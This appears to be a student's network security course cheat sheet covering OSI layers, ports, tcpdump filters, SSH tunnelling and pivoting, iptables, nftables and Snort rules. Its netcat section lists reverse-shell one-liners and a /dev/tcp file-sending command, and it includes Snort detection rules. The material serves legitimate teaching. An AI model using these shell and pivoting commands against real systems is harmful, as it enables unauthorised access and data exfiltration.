FUNDAMENTALS
1 = bit 
4 = nibble
8 = byte
16 = half word
32 = word
64 = double word


OSI MODEL 

[7] - appliction - data - DNS,HTTP,TELNET
FTP (TCP 20/21) -- Active and Passive
SSH (TCP 22) -- Server, Clients, Sessions, Keys (User, Host, Session), Key Generator, Known-hosts database, Agent, Signer, Random Seed, Configuration File
Telnet (TCP 23)    SMTP (TCP 25)    TACACS (TCP 49) SIMPLE/EXTENDED    DNS (QUERY/RESPONSE) (TCP/UDP 53)
HTTP(S) (TCP 80/443)    POP (TCP 110)    IMAP (TCP 143)    RDP (TCP 3389)        DHCP (UDP 67/68)
TFTP (UDP 69)    NTP (UDP 123)    SNMP (UDP 161/162)    RADIUS (UDP 1645/1646 AND 1812/1813)    RTP (UDP any above 1023)

[6] - presentation - data - SSL,TLS,JPEG,GIF
Translating -- interoperability between encoding methods
Formatting -- ASCII, EBCDIC, .doc, .ppt, .xls, mp3, wav, avi, mp4, bmp, jpeg, gif, tiff, or png
Encryption >> 
<<Symetric - AES, Blowfish, Twofish, DES, RC4
<<Asymetric - PKI, Deffie-Hellman, DSS, RSA, Elliptic Curve
Compression of data -- Zip, TAR, RAR, 7zip, CAB

[5] - session - data - NetBIOS,PPTP, RPC, NFS
maintain the state of your ongoing connections
Socks 4/5 (TCP 1080)    RPC (Any Port)
PPTP (TCP 1723)         L2TP (TCP 1701)
SMB/CIFS (TCP 139/445 AND UDP 137/138) -- SMB resides over NetBios 

[4] - transport - segment - TCP, UDP
TCP - connection oriented protocol
3-way Handshake -- SYN, SYN/ACK, ACK
Data Transfer -- PSH/ACK, ACK
4-way Termination -- FIN/ACK, ACK, FIN/ACK, ACK
UDP - connectionless
More lightweight and suited for latency sensitive applications, or applications that do not benefit from a stateful connection.

[3] - network - packet - IP,ICMP,IGMP
layer of internetworking is discussed and it’s parameters are defined
[MTU - (IHL * 4)]/8 = offset
IPv4 - 1970's , IPv6 - 2011

[2] - data link - frames - PPP, ATM, 802.2/3 Ethernet, Frame Relay
two hosts need to communicate across a common form of physical medium
Sublayers -- MAC (Media Access Control) and LLC (Logical Link Control)
Ethernet Header, ARP Header

[1] - physical - bits - Bluetooth, USB, 802.11 (Wi-Fi), DSL, 1000Base-T
data is physically sent across the network as ones and zeros
Hardware Specifications, ENcoding and Signaling, Data Transmission and Reception, Physical netwokr Design

Layer 2 Switching Technologies
Switch Operation -- Fast Forward, Fragment Free, Store and Forward
Cam Table -- Learn (Source MAC), Forward (Destination)
IEEE 802.1AD "Q-IN-Q" -- Standard (0x88A8), Non-Standard (0x9100)

Spanning Tree Protocol (STP) >>
<<Elect root bridge
<<Identify root ports on non-root bridge
<< Identify designated port
<<Set alt ports to blocking

Layer 2 Discovery Protocols -- CDP, FDP, LLDP
Dynamic Trunking Protocol
VLAN Trunking Protocol
Port Security Modes -- Shutdown, Restrict, Protect

BGP -- Road-map of Internet
routes traffic between AS number
Advertises IP CIDR Address Blocks
Establishes peer relationships
Complicated Configuration and slow path reaction

Hijacking BGP -- Illegitimate advertising of addresses
Propogates flase info
Purpose is ..
..stealing prefixes
..monitoring traffic
..intercept (possibly modify)
..black holing traffic
..performing MitM attacks

Hijacking BGP Defense -- IP prefix filtering
Hijacking detection..
..Tracking change in TTL
..Increased RTT, increases latency
..Monitoring misdirected traffic 
BGPSec

Capture Library
Libpcap
WinPcap
NPCAP

sudo tcpdump -i eth0 -XXvvn 'not port 22'

Berkeley Packet Filters
Requests SOC_RAW, setsockopt calls SO_ATTACH_FILTER

tcpdump {A} [B:C] {D} {E} {F} {G}

A = Protocol (ether | arp | ip | ip6 | icmp | tcp | udp)
B = Header Byte offset
C = optional: Byte Length. Can be 1, 2 or 4 (default 1)
D = optional: Bitwise mask (&)
E = Operator (= | == | > | < | <= | >= | != | () | << | >>)
F = Result of Expresion
G = optional: Logical Operator (&& ||) to bridge expressions
tcpdump 'ether[12:2] = 0x0800 && (tcp[2:2] != 22 &&)'

-User Space Sockets-
Stream Sockets
Datagram Sockets
-applications-
tcpdump  nmap  wireshark  netcat  /dev/tcp /dev/udp

-Kernel Space Sockets- (sudo required)
Raw Sockets
-applicatons-
tcpdump/wireshark on wire,  nmap for os id or to set specific flags,  netcat listener,  scapy


s = socket.socket(socket.FAMILY, socket.TYPE, socket.PROTOCOL)
socket.socket([*family*[,*type*[*proto*]]])
family -AF_INET, AF_INET6, AF_UNIX
type -SOCK_STREAM, SOCK_DGRAM, SOCK_RAW
proto -0, IPPROTO_RAW (only necessary for sock_raw)

Raw Sockets
Must include ip header and next header
requires guidance from RFC 
RFCs- technical and organized documents 
Testing/Avoiding specific defense mechanisms
Obfuscating data
Manually crafting a packet (chosen data in header)

banner grab
nc [ip] [port] (-u for UDP port)

curl [url or ip[port]] 
wget [url or ip[port]]/filename
eog <png file>
sudo nmap -sU <IP> -T4 -p<port> -A

PC1 -- nc -lp <port>
PC2 -- nc <PC1 IP><port> 0<pipe |nc <PC3 IP><port1> 1>pipe
PC3 -- nc -lp <port1>

FTP data(20) control(21) PW
active and passive

SFTP (TCP 22) PW
FTPS (TCP 443) PW

SCP (TCP 22) PW or SSH key --
-download from remote to local dir [scp student@172.16.82.106:secretstuff.txt /home/student]
-upload to a remote from a local dir [scp secretstuff.txt student@172.16.82.106:/home/student]
-copy from remote host to a seperate remote host [scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student]
-scp <username>@<target IP>:<target filepath> <. or name of file at current location>
-scp <source><destination>

SCP w/ alt SSHD
-download from remote to local dir [scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student]
-upload to a remote from a local dir [scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student]

SCP through tunnel
[ssh student@172.16.82.106 -L 1111:localhost:22 -NT]
-download from remote to local dir [scp -P 1111 student@localhost:secretstuff.txt /home/student]
-upload to a remote from a local dir [scp -P 1111 secretstuff.txt student@localhost:/home/student]

Netcat (CLIENT TO LISTENER FILE TRANSFER)
Client (sends file): nc 10.2.0.2 9001 < file.txt
Listener (receive file): nc -l -p 9001 > newfile.txt

Netcat (LISTENER TO CLIENT FILE TRANSFER)
Listener (sends file): nc -l -p 9001 < file.txt
Client (receive file): nc 10.2.0.2 9001 > newfile.txt

Netcat Relay
On Client -
mknod mypipe p
nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe
On Listener2 (sends) - nc -l -p 9002 < infile.txt
On Listener1 (receives) - nc -l -p 9001 > outfile.txt
writes out to both through named pipe

File transfer /dev/tcp (host w/out nc)
on receiving - nc -l -p 1111 > file.txt
on sending - cat file.txt > /dev/tcp/10.2.0.2/1111

Reverse shell (nc)
shelled into remote host - nc -c /bin/sh <ip> <unfiltered port>
piping bash - /bin/sh | nc <ip> <unfiltered port>
listen for shell - nc -l -p <same unfiltered port> -vvv
using -e - nc -l -p <unfiltered port> -e /bin/bash

ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<pivot ip> -NT
ssh -p <optional alt port> <user>@<pivot ip> -L <local bind port>:<tgt ip>:<tgt port> -NT

create local port 1111 on local host, forwards to target host port 80[ssh student@172.16.82.106 -L 1111:localhost:80 -NT]


PC1> ssh user@S1 -L 1111:S2:22 -NT      

PC1> nc 127.0.0.1 <local port>

PC1> wget -r 127.0.0.1:<local port>                                       

PC1> ssh user@S1 -L 1112:S2:23 -NT (on S2 through telnet port 23)

PC1> telnet 127.0.0.1 1112

S2> ssh user@S1 -R 1200:127.0.0.1:22 -NT 

PC1> ssh user@S1

S1> nc 127.0.0.1 1200

PC1> ssh user@S1 -L 1113:127.0.0.1:1200 -NT

PC1> ssh S2@127.0.0.1 -p 1113 -D 9050 -NT

PC1> proxychains nmap PC2 -Pn -A -T4 -vvvv

PC1> proxychains wget -r PC2

PC1> proxychains ssh PC2@PC2 

PC2> situational awareness

PC1 -------NO!------S1(22)----------S2(21,22,23,80)---------NO!-----------PC2(22,80)
1112-S2:23         1200-S2:22                                              
1113-S1:1200
9050-S2:*


ssh <user>@<ip> -L <bind port>:<tgt IP>:<tgt port> -NT
ssh <user>@<ip> -R <bind port>:<tgt IP>:<tgt port> -NT
ssh <user>@<ip> -D 9050 -NT

proxychains nmap <IP> -Pn -A -vvvv -T4
wget -r 127.0.0.1:42200 (through a tunnel on 42200)
41700-41799
internet_host$ ssh netX_studentX@{T3_float_ip} -L NssXX:10.3.0.27:80 -NT

Fingerprinting - 
POF config - /etc/p0f/p0f.fp
sudo p0f (-r/read -i/interface) <pcap file>
turn into a file ( -o /<filepath>)
sudo cat <filepath> | grep "mod=http"

Network traffic baselining  - 
snapshot of what network looks like during a time frame (7 days)
determines current state
current utilization of resources
normal vs peak frames
verify port and protocol use

sudo tcpdump -r /<filepath> <berekeley packet filter> | awk '{print $3}'(ip) | cut -d. -f1,2,3,4 | sort | uniq -C
how many times an ip sent whatever the berkeley packet filter

iptables -t [table] -A [chain] [rules] -j [action]
-i [ iface ]
-o [ iface ]
-s [ ip.add | network/CIDR ]
-d [ ip.add | network/CIDR ]
-I (insert INPUT|OUTPUT)
RULES SYNTAX
-p icmp [ --icmp-type { type# | code# } ]
-p tcp [ --sport | --dport { port1 |  port1:port2 } ]
-p tcp [ --tcp-flags { SYN | ACK | PSH | RST | FIN | URG | ALL | NONE } ]
-p udp [ --sport | --dport { port1 | port1:port2 } ]
-m state --state [ NEW | ESTABLISHED | RELATED | UNTRACKED | INVALID ]
-m mac [ --mac-source | --mac-destination ] [mac]
-p [tcp|udp] -m multiport [ --dports | --sports | --ports { port1 | port1:port15 } ]
-m bpf --bytecode [ 'bytecode' ]
-m iprange [ --src-range | --dst-range { ip1-ip2 } ]

ACTION SYNTAX
-j [ ACCEPT | REJECT | DROP ]

MODIFY IPTABLES
iptables -t [table] -F (flush table)
iptables -t [table] -P [chain] [action] (change default policy)
iptables -t [table] -L --line-numbers (list rules with rule numbers)
iptables -t [table] -S (lists rules as commands)
iptables -t [table] -I [chain] [rule num] [rules] -j [action] (inserts before rule number)
iptables -t [table] -R [chain] [rule num] [rules] -j [action] (replaces rule @ number)
iptables -t [table] -D [chain] [rule num] (deletes rule @ number)

sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT (accept all ssh into us)
sudo iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT 
sudo iptables -A INPUT -p TCP -m multiport --ports 6010,6011,6012 -j ACCEPT (allow terminator)

NFTABLE
ip -ipv4    ip6 -ipv6  inet -ipv4 and ipv6
arp -layer 2  
chain types -- filter,route,nat

SYNTAX
nft add table [family] [table]
[family] = ip*, ip6, inet, arp, bridge and netdev
[table] = user provided name for the table
nft add chain amily] [table] [chain] { [ftype [type] hook [hook] priority [priority] \; policy [policy] \;} (BASE CHAIN)
[chain] = User defined name for the chain
[type] =  can be filter, route or nat
[hook] = prerouting, ingress, input, forward, output or postrouting
[priority] = user provided integer. Lower number = higher priority. default = 0. Use "--" before negative numbers
; [policy] ; = set policy for the chain. Can be accept (default) or drop
nft add rule [family] [table] [chain] [matches (matches)] [statement] (CREATE RULE)
[matches] = typically protocol headers(i.e. ip, ip6, tcp, udp, icmp, ether, etc)
(matches) = these are specific to the [matches] field
[statement] = action performed when packet is matched. Some examples are: log, accept, drop, reject, counter, nat (dnat, snat, masquerade)

RULE MATCH OPTONS 
ip [ saddr | daddr { ip | ip1-ip2 | ip/CIDR | ip1, ip2, ip3 } ]
tcp flags { syn, ack, psh, rst, fin }
tcp [ sport | dport { port1 | port1-port2 | port1, port2, port3 } ]
udp [ sport| dport { port1 | port1-port2 | port1, port2, port3 } ]
icmp [ type | code { type# | code# } ]
ct state { new, established, related, invalid, untracked }
iif [iface]
oif [iface]

MODIFY NFTABLES
nft { list | flush } ruleset
nft { delete | list | flush } table [family] [table]
nft { delete | list | flush } chain [family] [table] [chain]
nft list table [family] [table] [-a] (list with handle numbers)
nft add rule [family] [table] [chain] [position <position>] [matches] [statement](Adds after position)
nft insert rule [family] [table] [chain] [position <position>] [matches] [statement](Inserts before position)
nft replace rule [family] [table] [chain] [handle <handle>] [matches] [statement](Replaces rule at handle)
nft delete rule [family] [table] [chain] [handle <handle>](Deletes rule at handle)
nft add chain [family] [table] [chain] { \; policy [policy] \;} (change default policy)

iptables -t nat -A POSTROUTING -o eth0 -s 192.168.0.1 -j SNAT --to 1.1.1.1
iptables -t nat -A POSTROUTING -p tcp -o eth0 -s 192.168.0.1 -j SNAT --to 1.1.1.1:9001
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 22 -j DNAT --to 10.0.0.1:22
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j DNAT --to 10.0.0.2:80
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j DNAT --to 10.0.0.3:443
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080

nft add table ip NAT (create)
nft add chain ip NAT PREROUTING { type nat hook prerouting priority 0 \; } (create)
nft add chain ip NAT POSTROUTING { type nat hook postrouting priority 0 \; }
nft add rule ip NAT POSTROUTING ip saddr 10.10.0.40 oif eth0 snat 144.15.60.11
nft add rule ip NAT POSTROUTING oif eth0 masquerade
iptables -t mangle -A POSTROUTING -o eth0 -j TTL --ttl-set 128
iptables -t mangle -A POSTROUTING -o eth0 -j DSCP --set-dscp 26
iptables -t nat -A POSTROUTING -p tcp -o eth0 -s 192.168.0.1 -j SNAT --to 1.1.1.1:9001
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -t nat -A PREROUTING -i eth0 -d 8.8.8.8 -j DNAT --to 10.0.0.1
iptables -t mangle -A POSTROUTING -o eth0 -j TTL --ttl-set 128
iptables -t mangle -A POSTROUTING -o eth0 -j DSCP --set-dscp 26


sudo iptables -A INPUT -p TCP -m multiport --ports 22,23,3389,6010,6011,6012 -j ACCEPT
sudo iptables -A OUTPUT -p TCP -m multiport --ports 22,23,3389,6010,6011,6012 -j ACCEPT
sudo iptables -A OUTPUT -p ICMP -d 10.10.0.40 -j ACCEPT
sudo iptables -A INPUT -p ICMP -d 10.10.0.40 -j ACCEPT
sudo iptables -A INPUT -p TCP -m multiport --ports 6579,4444 -j ACCEPT
sudo iptables -A OUTPUT -p TCP -m multiport --ports 6579,4444 -j ACCEPT
sudo iptables -A INPUT -p UDP -m multiport --ports 6579,4444 -j ACCEPT
sudo iptables -A OUTPUT -p UDP -m multiport --ports 6579,4444 -j ACCEPT
sudo iptables -A OUTPUT -p TCP -m multiport --ports 80 -j ACCEPT
sudo iptables -A INPUT -p TCP -m multiport --ports 80 -j ACCEPT


Snort rules
[action] [protocol] [s.ip] [s.port] [direction] [d.ip] [d.port] ( match conditions ;
Action - such as alert, log, pass, drop, reject
Protocol - includes TCP, UDP, ICMP and others
Source IP address - single address, CIDR notation, range, or any
Source Port - one, multiple, any, or range of ports
Direction - either inbound or in and outbound
Destination IP address - options mirror Source IP
Destination port - options mirror Source port

RULE OPTIONS
msg - specifies the human-readable alert message
reference - links to external source of the rule
sid - used to uniquely identify Snort rules
rev - uniquely identify revisions of Snort rules
Classtype - used to describe what a successful attack would do
priority - level of concern (1 - really bad, 2 - badish, 3 - informational)

PAYLOAD DETECTION
content - looks for a string of text.
|binary data| - to look for a string of binary HEX
nocase - modified content, makes it case insensitive
depth - specify how many bytes into a packet Snort should search for the specified pattern
distance - how far into a packet Snort should ignore before starting to search for the specified pattern relative to the end of the previous pattern match

NON-PAYLOAD DETECTION
Flow - direction (to/from client and server) and state of connection (established, stateless, stream/no stream)
ttl - The ttl keyword is used to check the IP time-to-live value.
tos - The tos keyword is used to check the IP TOS field for a specific value.
ipopts - The ipopts keyword is used to check if a specific IP option is present
seq - check for a specific TCP sequence number
ack - check for a specific TCP acknowledge number.

POST DETECION OPTIONS
logto - The logto keyword tells Snort to log all packets that trigger this rule to a special output log file.
session - The session keyword is built to extract user data from TCP Sessions.
react - This keyword implements an ability for users to react to traffic that matches a Snort rule by closing connection and sending a notice.
tag - The tag keyword allow rules to log more than just the single packet that triggered the rule.
activates - This keyword allows the rule writer to specify a rule to add when a specific network event occurs.
activated_by - This keyword allows the rule writer to dynamically enable a rule when a specific activate rule is triggered.
count - Allows the rule writer to specify how many packets to leave the rule enabled for after it is activated.

THRESHOLDING AND SUPPRESSION OPTIONS
type [limit | threshold | both]
limit alerts on the 1st event during defined period then ignores the rest.
Threshold alerts every [x] times during defined period.
Both alerts once per time internal after seeing [x] amount of occurrences of event. It then ignores all other events during period.
track [by_src | by_dst] - rate is tracked either by source IP address, or destination IP address
count [#] - number of rule matching in [s] seconds that will cause event_filter limit to be exceeded
seconds [seconds] - time period over which count is accrued. [s] must be nonzero value

EXAMPLES
Look for Anonymous ftp traffic alert tcp any any -> any 21 (msg:"Anonymous FTP Login"; content: "anonymous"; sid:2121; )
This will cause the pattern matcher to start looking at byte 6 in the payload) -- alert tcp any any -> any 21 (msg:"Anonymous FTP Login"; content: "anonymous"; offset:5; sid:2121; )
This will search the first 14 bytes of the packet looking for the word “anonymous” -- alert tcp any any -> any 21 (msg:"Anonymous FTP Login"; content: "anonymous"; depth:14; sid:2121; )
Deactivates the case sensitivity of a text search -- alert tcp any any -> any 21 (msg:"Anonymous FTP Login"; content: "anonymous"; nocase; sid:2121; )

RULE HEADER
Ping Sweep -- alert icmp any any -> 10.1.0.2 any (msg: "NMAP ping sweep Scan"; dsize:0; sid:10000004; rev: 1; )
Specific Hex bits -- alert tcp any any -> any any (msg:"NoOp sled"; content: "|9090 9090 9090|"; sid:9090; rev: 1; )
Incorrect telent -- alert tcp any 23 -> any any (msg:"TELNET login incorrect"; content:"Login incorrect"; flow:established,from_server; classtype:bad-unknown; sid:2323; rev:6; )

sudo snort -D -i eth0 -l /var/log/snort/ -c /etc/snort/snort.conf
sudo snort -r /home/activity_resources/pcaps/ids.pcap (-c snort.rule)
